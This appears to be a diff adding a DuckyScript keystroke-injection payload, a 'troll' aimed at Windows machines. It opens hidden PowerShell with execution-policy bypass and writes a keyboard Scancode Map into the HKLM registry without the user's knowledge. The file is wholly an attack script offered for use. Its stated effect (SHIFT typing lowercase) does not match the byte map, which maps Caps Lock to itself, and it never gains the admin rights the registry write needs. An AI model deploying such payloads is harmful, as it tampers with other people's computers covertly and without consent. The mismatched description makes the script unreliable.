@@ -1,0 +1,14 @@
+\
+REM Title: CAPS LOCK Troll
+REM Description: Remaps keyboard so SHIFT types lowercase and normal keys type UPPERCASE
+REM Target OS: Windows 10/11
+REM Author: DoctorSonic
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1200
+STRING $regPath='HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout'; $bytes=[byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x3A,0x00,0x3A,0x00,0x00,0x00,0x00,0x00); Set-ItemProperty -Path $regPath -Name 'Scancode Map' -Value $bytes; Write-Host 'Reboot required for full effect.' -ForegroundColor Yellow; Start-Sleep 2; exit
+ENTER
